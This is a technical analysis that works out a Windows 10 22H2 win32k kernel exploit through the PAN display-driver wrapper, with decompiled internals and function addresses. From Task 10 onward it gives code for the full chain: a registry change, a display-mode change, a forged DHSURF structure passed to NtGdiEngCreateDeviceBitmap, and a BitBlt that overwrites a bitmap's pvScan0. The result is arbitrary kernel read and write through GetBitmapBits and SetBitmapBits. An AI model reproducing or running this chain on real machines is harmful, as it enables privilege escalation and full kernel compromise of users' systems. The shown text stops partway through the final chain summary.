# PAN Mode Trigger Analysis — win32kfull.sys / win32kbase.sys

## Target: Windows 10 22H2 x64 — win32k PAN PDEV exploitation path

## Executive Summary

PAN mode is **NOT enabled by default** on a standard Windows 10 22H2 desktop. It is controlled by the `CapabilityOverride` registry value for the display device. When bit 0 of `CapabilityOverride` is set, the system creates a PAN PDEV (wrapping the real display driver) on the next display mode change. The PAN PDEV's function table includes `PanBitBlt`, which constructs `MULTIPANSURFLOCK` and calls `vLockBmp2AndPrepareForPunt`, which calls `EngModifySurface` with a user-controlled `pvScan0` read from `DHSURF+0x08`. `NtGdiEngCreateDeviceBitmap` is the syscall that injects the controlled DHSURF — and it has **no UMPD context check**.

---

## Task 1: What is PAN mode and how is it enabled?

### PAN Mode Definition

PAN mode is a display driver wrapper layer in win32kfull.sys that provides virtual screen panning — a virtual resolution larger than the physical screen, where the viewport scrolls to show different parts of the virtual desktop. The PAN driver wraps the real display driver: it intercepts GDI rendering calls, manages a shadow bitmap, and punts operations to the real driver after locking surfaces.

### Key Functions (win32kfull.sys, imagebase 0x1C0000000)

| Function | Address | Purpose |
|---|---|---|
| `PanEnablePDEV` | `0x1C0294B80` | Creates PANDEV (0x668 bytes), wraps real driver's DrvEnablePDEV |
| `PanBitBlt` | `0x1C0294720` | PAN-wrapped DrvBitBlt — constructs MULTIPANSURFLOCK, calls EngBitBlt |
| `PanCopyBits` | `0x1C0294990` | PAN-wrapped DrvCopyBits — calls PanBitBlt |
| `PanEnableSurface` | `0x1C0294EC0` | Creates PAN shadow surface |
| `PanDisablePDEV` | `0x1C02949E0` | Destroys PANDEV |
| `PanDisableSurface` | `0x1C0294A30` | Destroys PAN shadow surface |
| `PanCompletePDEV` | `0x1C0294930` | Completes PAN PDEV initialization |
| `PanStretchBlt` | `0x1C02956D0` | PAN-wrapped DrvStretchBlt |
| `PanAlphaBlend` | `0x1C02945A0` | PAN-wrapped DrvAlphaBlend |
| `PanTransparentBlt` | `0x1C0295E70` | PAN-wrapped DrvTransparentBlt |
| `PanGradientFill` | `0x1C0295200` | PAN-wrapped DrvGradientFill |
| `PanStrokePath` | `0x1C02959C0` | PAN-wrapped DrvStrokePath |
| `PanStrokeAndFillPath` | `0x1C0295830` | PAN-wrapped DrvStrokeAndFillPath |
| `PanTextOut` | `0x1C0295D10` | PAN-wrapped DrvTextOut |
| `PanningGetFunctionTable` | `0x1C0297340` | Returns `gadrvfnPanning` (21 DRVFN entries) |
| `GetPanCopyBits` | `0x1C0297330` | Returns PanCopyBits function pointer |

### PAN Function Table (gadrvfnPanning at 0x1C032F7A0)

The PAN driver's function table has 21 entries (returned by `PanningGetFunctionTable`). The table is a `DRVFN` array containing:

- INDEX_DrvEnablePDEV → PanEnablePDEV
- INDEX_DrvCompletePDEV → PanCompletePDEV
- INDEX_DrvDisablePDEV → PanDisablePDEV
- INDEX_DrvEnableSurface → PanEnableSurface
- INDEX_DrvDisableSurface → PanDisableSurface
- INDEX_DrvBitBlt → PanBitBlt
- INDEX_DrvCopyBits → PanCopyBits
- INDEX_DrvStretchBlt → PanStretchBlt
- INDEX_DrvAlphaBlend → PanAlphaBlend
- INDEX_DrvTransparentBlt → PanTransparentBlt
- INDEX_DrvGradientFill → PanGradientFill
- INDEX_DrvStrokePath → PanStrokePath
- INDEX_DrvStrokeAndFillPath → PanStrokeAndFillPath
- INDEX_DrvTextOut → PanTextOut
- ... (total 21 entries)

### PanEnablePDEV Internals (0x1C0294B80)

```c
PanEnablePDEV(DEVMODEW* pdm, ...) {
    PANDEV* ppandev = PALLOCMEM2(0x668);  // Allocate PANDEV
    // Copy real driver's function table from HDEV (offset 224*8 + 64)
    memcpy(ppandev + 792, HDEV->apfn + 64, ...);
    // Store real dimensions
    ppandev[2] = pdm->dmPelsWidth;
    ppandev[3] = pdm->dmPelsHeight;
    // Create semaphores
    bCreateSemaphores(ppandev);
    // Set virtual (panning) dimensions
    if (pdm->dmPanningWidth)
        ppandev[0] = pdm->dmPanningWidth;
    else
        ppandev[0] = pdm->dmPelsWidth;
    ppandev[1] = pdm->dmPanningHeight;
    // Call real driver's DrvEnablePDEV
    DHPDEV real_dhpdev = (*real_drvEnablePDEV)(pdm, ...);
    ppandev->dhpdev_real = real_dhpdev;  // offset 0x20
    ppandev->hdev = hdev;                // offset 0x30
    return (DHPDEV)ppandev;
}
```

### What Triggers PAN PDEV Creation?

PAN PDEV creation is triggered when the PDEVOBJ constructor (`win32kbase.sys:0x1C00B9020`) detects that the `CapabilityOverride` registry value has bit 0 set. The flow is:

1. `DrvCreateMDEV` → `hCreateHDEV` → `PDEVOBJ::PDEVOBJ`
2. `hCreateHDEV` passes `a5 = DrvGetDriverCapableOverRide(graphics_device)` as the 5th parameter
3. `DrvGetDriverCapableOverRide` reads the `CapabilityOverride` DWORD from the display device's registry key
4. In the PDEVOBJ constructor:
   ```c
   PDEV->flags_2608 = a12;  // = a5 from hCreateHDEV
   PDEV->flags_2612 = a13;  // = a6 from hCreateHDEV
   if (a12 & 1)             // CapabilityOverride bit 0
       PDEV->flags_2612 = 5; // Mark as PAN mode
   ```
5. Later in the constructor:
   ```c
   if (LDEV->type == 1 && PDEV->flags_2612 == 5) {
       // Use dynamic function table (PanningGetFunctionTable)
       qword_1C0255748(&drvfn, &count);  // Returns gadrvfnPanning
       bFillFunctionTable(drvfn, count, PDEV->apfn + 2688);
   } else {
       // Copy from LDEV's function table (normal driver)
       memcpy(PDEV->apfn + 2688, LDEV->apfn + 64, 0x340);
   }
   ```

### Is PAN Mode Enabled by Default?

**NO.** The `CapabilityOverride` registry value defaults to 0 (or does not exist). `DrvGetDriverCapableOverRide` returns 0 when the value is absent. Therefore `a5 & 1 = 0`, `PDEV->flags_2612` stays as `a6` (not 5), and the normal driver function table is used.

### Can We Enable PAN Mode from User Mode?

**YES**, but it requires:
1. **Write access** to `HKLM\SYSTEM\CurrentControlSet\Control\Video\{AdapterGUID}\0000` (requires admin privileges)
2. Set `CapabilityOverride` DWORD to `1` (or any value with bit 0 set)
3. **Trigger a display mode change** via `ChangeDisplaySettingsEx` or `ChangeDisplaySettings` to force PDEV recreation

The registry path is queried by `DrvGetRegistryHandleFromDeviceMap` which resolves the display device's registry key from the device map.

---

## Task 2: PanEnablePDEV Callers and Trigger Conditions

### Xrefs to PanEnablePDEV (0x1C0294B80)

PanEnablePDEV is **only referenced from data** (function tables), not called directly:

| Xref Address | Type | Context |
|---|---|---|
| `0x1C032F7A8` | data | `gadrvfnPanning[0]` — DRVFN entry for INDEX_DrvEnablePDEV |
| `0x1C035EF64` | data | Secondary function table (RVA table) |

PanEnablePDEV is called indirectly through the PDEV's function table. When the PDEVOBJ constructor fills the function table from `gadrvfnPanning` (via `PanningGetFunctionTable`), the `DrvEnablePDEV` slot at `PDEV + 0xA80` (offset 2688) is set to `PanEnablePDEV`. Then `PDEVOBJ::EnablePDEV` calls `*(PDEV + 0xA80)(devmode, ...)` to create the PDEV.

### Conditions for PAN PDEV Creation

1. The display device's `CapabilityOverride` registry value must have bit 0 set
2. A display mode change must occur (creating a new PDEV via `hCreateHDEV`)
3. The LDEV type must be 1 (LDEV_TYPE_DISPLAY — always true for display adapters)

### Is It Triggered by Display Mode Change?

**YES.** The display mode change path is:
```
NtUserChangeDisplaySettings (0x1C0018E30)
  → xxxUserChangeDisplaySettings (0x1C0019180)
    → xxxUserChangeDisplaySettingsInternal (0x1C00198CC)
      → DrvChangeDisplaySettings (0x1C0019E30)
        → DrvChangeDisplaySettingsInternal (0x1C0013A90)
          → DrvCreateMDEV (0x1C00128E8)
            → hCreateHDEV (0x1C0014AC8)
              → PDEVOBJ::PDEVOBJ (0x1C00B9020) [win32kbase]
                → PDEVOBJ::EnablePDEV → PanEnablePDEV
```

### Can a User-Mode API Trigger It?

**YES.** `ChangeDisplaySettingsEx` (user32.dll) → `NtUserChangeDisplaySettings` (syscall in win32kbase) triggers the full display mode change path. If `CapabilityOverride` bit 0 is already set in the registry, the PAN PDEV will be created.

---

## Task 3: Is PAN Always Present?

### PAN-Related Globals

| Global | Address | Purpose |
|---|---|---|
| `gadrvfnPanning` | `0x1C032F7A0` | DRVFN array for PAN driver (21 entries) |
| `qword_1C0255740` | win32kbase `0x1C0255740` | Runtime callback: PAN init check (set by win32kfull) |
| `qword_1C0255748` | win32kbase `0x1C0255748` | Runtime callback: get PAN function table (= PanningGetFunctionTable) |
| `qword_1C0255760` | win32kbase `0x1C0255760` | Runtime callback: post-EnablePDEV init |
| `qword_1C0255768` | win32kbase `0x1C0255768` | Runtime callback: post-EnablePDEV init function |

These qwords in win32kbase are **runtime-initialized** (all 0xFFFFFFFFFFFFFFFF in the static binary). They are filled by win32kfull during win32k initialization through a callback registration mechanism.

### Global Flag for PAN Active State

There is no single global boolean "PAN is active." Instead, each PDEV has:
- `PDEV + 0xA30` (offset 2608): flags field containing `CapabilityOverride` value
- `PDEV + 0xA34` (offset 2612): PAN mode flag — set to 5 when PAN is active

A PDEV is PAN-enabled if `*(DWORD*)(PDEV + 0xA34) == 5`.

### Standard Windows 10 22H2 Single Monitor

**PAN is NOT active** on a standard single-monitor Windows 10 22H2 desktop. The `CapabilityOverride` registry value is absent or 0 by default. The display driver (typically a WDDM driver via the CDD/IndirectDisplay path) is loaded directly without the PAN wrapper.

### Virtual Resolution via ChangeDisplaySettings

Setting a virtual resolution larger than the physical screen via `ChangeDisplaySettingsEx` does **NOT** automatically create a PAN PDEV. The PAN wrapper is only installed when `CapabilityOverride` bit 0 is set. The `dmPanningWidth`/`dmPanningHeight` fields in the DEVMODE are used by `PanEnablePDEV` to configure the virtual dimensions, but they do not trigger PAN mode creation — they only configure it once PAN mode is already enabled.

---

## Task 4: Alternative Trigger — Virtual Display Resolution

### Can We Use ChangeDisplaySettingsEx for Larger Resolution?

`ChangeDisplaySettingsEx` can request a larger resolution, but the display driver (WDDM) will either:
- Reject the mode (returns DISP_CHANGE_BADMODE)
- Accept it if the driver supports virtual modes
- Create a virtual desktop with panning (driver-managed, NOT PAN PDEV)

### Does This Create a PAN PDEV Automatically?

**NO.** The `dmPanningWidth`/`dmPanningHeight` fields in DEVMODE are consumed by `PanEnablePDEV` only if the PAN driver is already selected (via `CapabilityOverride`). Setting `dmPanningWidth`/`dmPanningHeight` in the DEVMODE passed to `ChangeDisplaySettingsEx` does NOT cause the system to use the PAN driver. The DEVMODE fields are passed through to whatever driver is selected — if the normal WDDM driver is selected, it ignores these fields.

### Example: 1920x1080 → 2560x1440 Virtual

Setting a 2560x1440 virtual resolution on a 1920x1080 physical screen:
- If the WDDM driver supports it: creates a driver-managed virtual desktop (NOT PAN PDEV)
- If the WDDM driver doesn't support it: fails with DISP_CHANGE_BADMODE
- **Either way, no PAN PDEV is created** unless `CapabilityOverride` bit 0 is set

---

## Task 5: EngBitBlt Dispatch to PanBitBlt

### EngBitBlt Decompile (win32kfull.sys:0x1C00CB280)

`EngBitBlt` is the engine's fallback BitBlt implementation. Key dispatch logic:

```c
BOOL EngBitBlt(SURFOBJ* psoTrg, SURFOBJ* psoSrc, ...) {
    // If target is a device surface (iType != 0), dispatch to SimBitBlt
    if (psoTrg->iType)
        return SimBitBlt(psoTrg, psoSrc, ...);
    // Otherwise, engine-managed DIB BitBlt (BltLnk, vDIBPatBlt, etc.)
    ...
}
```

### SimBitBlt Dispatch (win32kfull.sys:0x1C0277EB8)

`SimBitBlt` gets the driver's DrvBitBlt from the surface's PDEV:

```c
if (!psoMask) {
    if (PDEV->flags & 0x8000)
        return EngBitBlt(psoTrg, psoSrc, ...);  // Engine fallback
    else {
        DrvBitBlt = SURFACE::pfnBitBlt(psoTrg);  // Get from PDEV function table
        return DrvBitBlt(psoTrg, psoSrc, ...);   // Call driver's BitBlt
    }
}
```

### SURFACE::pfnBitBlt (win32kfull.sys:0x1C00B9DA0)

```c
PFN_BitBlt SURFACE::pfnBitBlt(SURFACE* this) {
    if (this->fjBitmap & 1)
        return *(PFN_BitBlt*)(this->hdev + 2832);  // PDEV function table
    else
        return EngBitBlt;  // Engine fallback
}
```

The function table slot at `PDEV + 0xB10` (offset 2832) contains the DrvBitBlt pointer. For a PAN PDEV, this is `PanBitBlt` (0x1C0294720).

### How Does It Decide to Call PanBitBlt vs Normal BitBlt?

The decision is made at PDEV creation time:
1. If `CapabilityOverride & 1`: PDEV function table is filled from `gadrvfnPanning` → DrvBitBlt = PanBitBlt
2. If `CapabilityOverride & 1 == 0`: PDEV function table is copied from the LDEV → DrvBitBlt = real driver's BitBlt

There is **no runtime flag check** in the dispatch path. The routing is determined entirely by which function pointer is in the PDEV's function table.

### Can We Set the Flag via User-Mode API?

**Not directly.** The flag is set during PDEV creation based on the registry value. There is no API to change the PDEV function table after creation. The only way to change it is to modify the registry and trigger a display mode change.

---

## Task 6: MulBitBlt and Other Mul* Functions

### Mul* Functions Purpose

The `Mul*` functions (MulBitBlt, MulStretchBlt, MulCopyBits, etc.) in win32kfull.sys are **multi-monitor proxy functions**. They handle BitBlt operations that span multiple monitors by iterating over each monitor's PDEV and dispatching the operation to each one.

### Do Mul* Functions Call PANSURFLOCK?

**NO.** `MulBitBlt` (0x1C02A1750) uses `MULTISURF` and `MSURF` classes for multi-monitor surface management, not `PANSURFLOCK` or `MULTIPANSURFLOCK`. The Mul* path does NOT call `EngModifySurface` with user-controlled values.

### MulBitBlt Key Code Path

```c
MulBitBlt(psoTrg, psoSrc, ...) {
    if (psoTrg->iType == STYPE_DEVICE)
        return bBitBltScreenToScreen(...);  // Direct screen-to-screen
    else
        return bBitBltFromScreen(...);      // From-screen blit

    // For multi-mon: iterate surfaces via MSURF::bFindSurface/bNextSurface
    // Call OffBitBlt or OffCopyBits for each monitor
    // Uses MULTISURF for source, MULTIBRUSH for brush
    // Does NOT use PANSURFLOCK
}
```

### Can We Trigger EngModifySurface via Mul* Without PAN Mode?

**NO.** The Mul* functions do not call `EngModifySurface` at all. They call `OffBitBlt`/`OffCopyBits` which dispatch to the individual monitor's driver function, but there is no surface modification path equivalent to `vLockBmp2AndPrepareForPunt`.

---

## Task 7: Non-PAN Path to PANSURFLOCK

### Xrefs to PANSURFLOCK Constructor (0x1C029440C)

| Caller | Address | iType Check |
|---|---|---|
| PanGradientFill | 0x1C0295200 | Uses PANSURFLOCK (single-surface) |
| PanStrokeAndFillPath | 0x1C0295830 | Uses PANSURFLOCK |
| PanStrokePath | 0x1C02959C0 | Uses PANSURFLOCK |
| PanTextOut | 0x1C0295D10 | Uses PANSURFLOCK |

### Xrefs to MULTIPANSURFLOCK Constructor (0x1C0294214)

| Caller | Address | iType Check |
|---|---|---|
| PanAlphaBlend | 0x1C02945A0 | Uses MULTIPANSURFLOCK (multi-surface) |
| PanBitBlt | 0x1C0294720 | Uses MULTIPANSURFLOCK |
| PanStretchBlt | 0x1C02956D0 | Uses MULTIPANSURFLOCK |
| PanTransparentBlt | 0x1C0295E70 | Uses MULTIPANSURFLOCK |

### Is There a Non-PAN Path to PANSURFLOCK?

**NO.** All callers of both PANSURFLOCK and MULTIPANSURFLOCK constructors are `Pan*` functions. There is no code path from a non-PAN PDEV to PANSURFLOCK. The `Mul*` functions use a completely different surface locking mechanism (`MULTISURF`/`MSURF`).

**Conclusion: PAN mode (via `CapabilityOverride` registry) is REQUIRED to reach PANSURFLOCK.**

---

## Task 8: Creating a Fake PAN PDEV

### Can We Create a Display DC with PAN Support Without PAN Hardware?

**NO.** PAN mode is not a hardware feature — it's a software wrapper. The PAN PDEV is created by the system when the `CapabilityOverride` registry value is set. There is no way to create a PAN PDEV from user mode without modifying the registry.

### Can We Set PDEV Flags to Make the Kernel Think PAN Is Active?

**Not directly.** The PDEV function table is populated during PDEV creation. There is no API to modify it afterward. The function table lives in kernel memory (PDEV + 0xA80), which is not accessible from user mode without an existing kernel R/W primitive.

### Can We Use CreateDC with a Specific Display Device Name?

`CreateDC` creates a DC for a specific display device. The DC's PDEV is selected based on the display device's current settings. If the display device has `CapabilityOverride` bit 0 set and a PAN PDEV was created, the DC will use the PAN PDEV. But `CreateDC` itself does not trigger PDEV creation — it uses the existing PDEV.

---

## Task 9: NtGdiEngBitBlt Direct Call

### Can We Call NtGdiEngBitBlt Directly?

**YES**, `NtGdiEngBitBlt` is a syscall at `0x1C013B6A0` in win32kfull.sys. However, it **requires a UMPD context**:

```c
NtGdiEngBitBlt(SURFOBJ* psoTrg, SURFOBJ* psoSrc, ...) {
    UMPDOBJ* umpd = UMPDOBJ::GetThreadCurrentObj(W32GetThreadWin32Thread());
    if (!umpd)
        return 0;  // FAIL: No UMPD context
    // Convert user SURFOBJ handles to kernel SURFOBJ
    UMPDSURFOBJ::UMPDSURFOBJ(..., psoTrg, umpd);
    // ...
    return EngBitBlt(psoTrg, psoSrc, ...);
}
```

Without a UMPD context (which requires `NtGdiEngCreateDriverObj` or similar setup), `NtGdiEngBitBlt` returns 0. This is a **dead end** for the exploit.

### Does NtGdiEngBitBlt Go Through the Pan* Dispatch?

**YES**, indirectly. `NtGdiEngBitBlt` calls `EngBitBlt`, which calls `SimBitBlt` for device surfaces, which calls `SURFACE::pfnBitBlt` to get the driver's DrvBitBlt. For a PAN PDEV, this returns `PanBitBlt`. So the PAN dispatch IS triggered, but only if:
1. The caller has a UMPD context
2. The target surface belongs to a PAN PDEV

### Can We Craft Parameters to Force the Pan* Path?

**Not without UMPD.** The UMPD check at the beginning of `NtGdiEngBitBlt` prevents calling it without a registered UMPD context. Even with UMPD, the PAN dispatch only happens if the surface's PDEV is PAN-enabled.

### Alternative: Use NtGdiBitBlt Instead

`NtGdiBitBlt` (0x1C0084DE0) → `NtGdiBitBltInternal` (0x1C0088600) is the standard BitBlt syscall. It does NOT require UMPD. It goes through the normal GDI dispatch:
```
NtGdiBitBlt → NtGdiBitBltInternal → EngBitBlt/SimBitBlt → SURFACE::pfnBitBlt → PanBitBlt
```

If the DC's PDEV is PAN-enabled, `NtGdiBitBlt` will dispatch to `PanBitBlt`. This is the **correct path** for triggering the exploit.

---

## Task 10: Complete Trigger Design

### Step 1: Enable PAN Mode (Requires Admin)

```powershell
# Find the display adapter GUID
$adapters = Get-CimInstance Win32_VideoController
foreach ($adapter in $adapters) {
    # Set CapabilityOverride with bit 0
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Video\$($adapter.PNPDeviceID)\0000"
    if (Test-Path $regPath) {
        Set-ItemProperty -Path $regPath -Name "CapabilityOverride" -Value 1 -Type DWord
    }
}
```

The registry path is typically:
```
HKLM\SYSTEM\CurrentControlSet\Control\Video\{AdapterGUID}\0000
```

Set `CapabilityOverride` (DWORD) to `1` (bit 0 = PAN wrapper enabled).

### Step 2: Trigger Display Mode Change

```cpp
// Force PDEV recreation with PAN mode
DEVMODEW dm = {};
dm.dmSize = sizeof(DEVMODEW);
dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
dm.dmPelsWidth = GetSystemMetrics(SM_CXSCREEN);
dm.dmPelsHeight = GetSystemMetrics(SM_CYSCREEN);

// This triggers: NtUserChangeDisplaySettings → DrvCreateMDEV → hCreateHDEV → PDEVOBJ(PAN)
LONG result = ChangeDisplaySettingsExW(
    L"\\\\.\\DISPLAY1",  // Display device name
    &dm,
    NULL,
    CDS_UPDATEREGISTRY,  // Persist the change
    NULL
);
```

After this call, the display PDEV is recreated. Since `CapabilityOverride & 1 == 1`, the PDEVOBJ constructor uses `PanningGetFunctionTable` to fill the function table with Pan* functions.

### Step 3: Create a Display DC with PAN PDEV

```cpp
// Get a DC for the display — this DC's PDEV is now PAN-enabled
HDC hdc = CreateDCW(L"\\\\.\\DISPLAY1", NULL, NULL, NULL);
// Or: HDC hdc = GetDC(NULL); // Screen DC, also uses PAN PDEV
```

### Step 4: Set Up the Fake DHSURF in User Mode

```cpp
// Fake DHSURF structure — must be in user mode, kernel will read from it
// because the thread is in the user's process context during BitBlt

#pragma pack(push, 8)
struct FakeDHSURF {
    void*    pad_00;           // offset 0x00: unused by vLockBmp2
    void*    pvScan0;          // offset 0x08: CONTROLLED pvScan0 → written to SURFACE+0x50
    ULONG    lDelta;           // offset 0x10: CONTROLLED lDelta → written to SURFACE+0x48
    ULONG    pad_14;           // offset 0x14: punt count — MUST be 0
    ULONG    pad_18;           // offset 0x18: padding
    ULONG    pad_1C;           // offset 0x1C: padding
    void*    pPANDEV;          // offset 0x20: pointer to structure with HDEV at +0x30
                               //         and HSEMAPHORE at +0x308
};
#pragma pack(pop)

// The structure at pPANDEV needs:
// offset 0x30: valid HDEV (can be obtained from the display DC)
// offset 0x308: valid HSEMAPHORE (kernel semaphore used by EngAcquireSemaphore)
```

**Challenge:** The `pPANDEV` field at DHSURF+0x20 must point to a structure containing:
- A valid HDEV at offset 0x30
- A valid HSEMAPHORE at offset 0x308

The HDEV can be obtained from the display DC. The HSEMAPHORE is a kernel-only handle — we need to either:
- **Leak the PANDEV kernel address** (via an info leak)
- **Use the real PANDEV** by having a bitmap that already has a valid DHSURF pointing to the real PANDEV, and corrupt it
- **Find an alternative path** that doesn't require the semaphore

### Step 5: Call NtGdiEngCreateDeviceBitmap

```cpp
// NtGdiEngCreateDeviceBitmap — NO UMPD check!
// Syscall number varies by Windows build — use NtCallEnterpriseFilter or direct syscall

// dhsurf: our fake user-mode DHSURF pointer
// sizl: valid bitmap size (e.g., 100x100)
// iFormat: valid format (1=BMF_1BPP through 6=BMF_32BPP, must be 1-8)

HBITMAP hbm = NtGdiEngCreateDeviceBitmap(
    (DHSURF)&fakeDhsurf,  // User-controlled DHSURF
    { 100, 100 },          // Valid size
    6                      // BMF_32BPP (iFormat = 6)
);
// Result: bitmap with iType=3 (STYPE_BITMAP)
// SURFOBJ.dhsurf at SURFACE+0x18 = &fakeDhsurf (our user-mode pointer)
```

**Key finding:** `NtGdiEngCreateDeviceBitmap` (0x1C02B2310) does NOT check for UMPD context:
```asm
sub     rsp, 28h
mov     r9, rdx              ; save sizl
mov     r10, rcx             ; save dhsurf
mov     rcx, r9              ; size arg for ValidUmpdSizl
mov     dl, 1                ; bool arg
call    ValidUmpdSizl         ; validate size only — NO UMPD context check
test    eax, eax
jz      fail
lea     eax, [r8-1]          ; format - 1
cmp     eax, 7               ; format must be 1-8
ja      fail
bts     r8d, 0Fh             ; iFormat |= 0x8000
mov     rdx, r9              ; sizl
mov     rcx, r10             ; dhsurf
call    EngCreateDeviceBitmap
```

### Step 6: Trigger BitBlt That Routes to PanBitBlt

```cpp
// Select the fake device bitmap into a memory DC
HDC hdcMem = CreateCompatibleDC(hdc);
HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbm);

// BitBlt from the fake bitmap (source) to the PAN display DC (target)
// This triggers: NtGdiBitBlt → NtGdiBitBltInternal → EngBitBlt → SimBitBlt
//   → SURFACE::pfnBitBlt → PanBitBlt (because target PDEV is PAN-enabled)
//   → MULTIPANSURFLOCK constructor → vLockBmp2AndPrepareForPunt
//   → reads pvScan0 = *(fakeDhsurf + 0x08) → EngModifySurface → writes to SURFACE+0x50

BitBlt(
    hdc,           // Destination: PAN-enabled display DC
    0, 0, 100, 100,
    hdcMem,        // Source: memory DC with fake device bitmap
    0, 0,
    SRCCOPY        // rop4 = 0x00CC0000
);
```

### MULTIPANSURFLOCK Constructor Flow (0x1C0294214)

```c
MULTIPANSURFLOCK(this, pandev, &psoTrg, &psoSrc, prclTrg, &rclSrc, &puntFlag, pco) {
    // Compare source and target SURFOBJ pointers
    v16 = min(psoSrc, psoTrg);  // lower address
    v15 = max(psoSrc, psoTrg);  // higher address

    if (v16) {
        if (v16 == v15) {
            // Same surface
            if (v16->iType == 3) {  // STYPE_BITMAP — our fake bitmap!
                this->bmp1 = v16;
                vLockBmp1AndPrepareForPunt(this, 0);  // ← EngModifySurface with controlled pvScan0
            }
        } else {
            // Different surfaces
            if (v16->iType == 3) {  // STYPE_BITMAP
                this->bmp1 = v16;
                vLockBmp1AndPrepareForPunt(this, v16 == psoSrc);
            }
            if (v15->iType == 3) {  // STYPE_BITMAP — our fake bitmap as source
                this->bmp2 = v15;
                vLockBmp2AndPrepareForPunt(this, v15 == psoSrc);  // ← EngModifySurface
            }
        }
    }
}
```

### vLockBmp2AndPrepareForPunt (0x1C029672C) — The Write

```c
void vLockBmp2AndPrepareForPunt(MULTIPANSURFLOCK* this, int isSource) {
    SURFOBJ* psoSrc = this->bmp2;           // Source SURFOBJ (our fake bitmap)
    DHSURF dhsurf = psoSrc->dhsurf;         // = our fakeDhsurf user-mode pointer
    this->dhsurf2 = dhsurf;                 // Save it

    // Acquire semaphore from *(dhsurf + 0x20) + 0x308
    EngAcquireSemaphore(*(HSEMAPHORE*)(*(QWORD*)(dhsurf + 0x20) + 0x308));

    if (*(DWORD*)(dhsurf + 0x14) == 0) {    // Punt count must be 0
        EngModifySurface(
            psoSrc->hsurf,                  // HSURF from SURFOBJ+0x08
            *(HDEV*)(*(QWORD*)(dhsurf + 0x20) + 0x30),  // HDEV from PANDEV+0x30
            0,                              // flModification = 0
            0,                              // reserved = 0
            dhsurf,                         // DHSURF (our controlled pointer)
            *(PVOID*)(dhsurf + 0x08),       // pvScan0 = OUR CONTROLLED VALUE ←←←
            *(DWORD*)(dhsurf + 0x10),       // lDelta = OUR CONTROLLED VALUE
            NULL                            // psoSrc = NULL
        );
    }

    (*(DWORD*)(dhsurf + 0x14))++;           // Increment punt count
    EngReleaseSemaphore(...);
    // Acquire additional semaphore for read/write access
}
```

### Step 7: Verify the Write Succeeded

After `EngModifySurface`, the SURFACE's `pvScan0` field (at SURFACE+0x50, which corresponds to SURFOBJ+0x38) is overwritten with our controlled value from `fakeDhsurf.pvScan0`.

```cpp
// Verify by reading bitmap bits — if pvScan0 was corrupted,
// GetBitmapBits will read from our controlled address
DWORD checkBuffer[16] = {};
GetBitmapBits(hbm, sizeof(checkBuffer), checkBuffer);
// If the values match what's at our controlled pvScan0 address, the write succeeded
```

### Step 8: Use Corrupted pvScan0 for Arbitrary R/W

```cpp
// Now the bitmap's pvScan0 points to our chosen kernel address
// GetBitmapBits/SetBitmapBits operate relative to pvScan0

// READ: Read 8 bytes from kernel address KADDR
fakeDhsurf.pvScan0 = (void*)KADDR;
// (Need to re-trigger BitBlt to re-apply, or the write is already done)
BYTE readBuf[8] = {};
GetBitmapBits(hbm, 8, readBuf);
// readBuf now contains the 8 bytes at KADDR

// WRITE: Write 8 bytes to kernel address KADDR
BYTE writeBuf[8] = { 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41 };
SetBitmapBits(hbm, 8, writeBuf);
// 8 bytes written to KADDR
```

### DHSURF Structure Layout (Required for Exploit)

```
Offset  Size  Field            Requirement
------  ----  -----            -----------
0x00    8     pad              unused (set to 0)
0x08    8     pvScan0          CONTROLLED: target kernel address for arbitrary R/W
0x10    4     lDelta           CONTROLLED: scanline stride (set to 4 for 32bpp)
0x14    4     punt_count       MUST be 0 (so EngModifySurface is called)
0x18    8     pad              unused (set to 0)
0x20    8     pStructure       pointer to structure with:
                                 +0x030: valid HDEV (kernel handle)
                                 +0x308: valid HSEMAPHORE (kernel semaphore)
```

---

## Key Questions Answered

### 1. Is PAN mode enabled by default on a standard Windows 10 22H2 desktop?

**NO.** PAN mode requires the `CapabilityOverride` registry value to have bit 0 set. By default, this value is absent or 0. The standard Windows 10 22H2 desktop uses the WDDM driver directly without the PAN wrapper.

### 2. Can we enable PAN mode from user mode via ChangeDisplaySettings?

**YES**, but it requires two steps:
1. **Registry modification** (admin required): Set `HKLM\SYSTEM\CurrentControlSet\Control\Video\{GUID}\0000\CapabilityOverride` DWORD to `1`
2. **Display mode change**: Call `ChangeDisplaySettingsEx` with the current resolution (or any valid mode) to trigger PDEV recreation

`ChangeDisplaySettingsEx` alone does NOT enable PAN mode — the registry value must be set first. The display mode change triggers `DrvCreateMDEV` → `hCreateHDEV` → `PDEVOBJ::PDEVOBJ`, which reads `CapabilityOverride` via `DrvGetDriverCapableOverRide` and selects the PAN function table if bit 0 is set.

### 3. Is there a non-PAN path to PANSURFLOCK?

**NO.** All callers of both `PANSURFLOCK` (0x1C029440C) and `MULTIPANSURFLOCK` (0x1C0294214) constructors are exclusively `Pan*` functions (PanBitBlt, PanStretchBlt, PanAlphaBlend, PanTransparentBlt, PanGradientFill, PanStrokePath, PanStrokeAndFillPath, PanTextOut). The `Mul*` multi-monitor functions use a separate `MULTISURF`/`MSURF` mechanism that does NOT call `EngModifySurface` with user-controlled values. There is no alternative code path to reach PANSURFLOCK without a PAN PDEV.

### 4. Can we call NtGdiEngBitBlt directly to trigger the punting path?

**YES but it requires UMPD context**, making it impractical as the sole trigger. `NtGdiEngBitBlt` (0x1C013B6A0) checks for a UMPD context at the start and returns 0 if none exists. However, the standard `NtGdiBitBlt` syscall (0x1C0084DE0) does NOT require UMPD and also dispatches through `EngBitBlt` → `SimBitBlt` → `SURFACE::pfnBitBlt` → `PanBitBlt` when the target DC uses a PAN PDEV. Use `NtGdiBitBlt` (via `BitBlt` from GDI32) as the trigger instead.

---

## Complete Attack Chain Summary

```
[Admin] Set CapabilityOverride = 1 in registry
    ↓
[User] ChangeDisplaySettingsEx → PDEV recreated with PAN function table
    ↓
[User] Allocate FakeDHSURF in user mode (pvScan0 = target addr, lDelta = 4, punt = 0)
    ↓
[User] NtGdiEngCreateDeviceBitmap(fakeDhsurf, {100,100}, 6) → HBITMAP (iType=3, dhsurf=user ptr)
    ↓
[User] BitBlt(hdcDisplay, hdcMemWithFakeBitmap, SRCCOPY)
    ↓
    NtGdiBitBlt → NtGdiBitBltInternal → EngBitBlt → SimBitBlt
    → SURFACE::pfnBitBlt → PanBitBlt (PAN PDEV function table)
    → MULTIPANSURFLOCK::MULTIPANSURFLOCK
        → iType == 3 (STYPE_BITMAP) detected
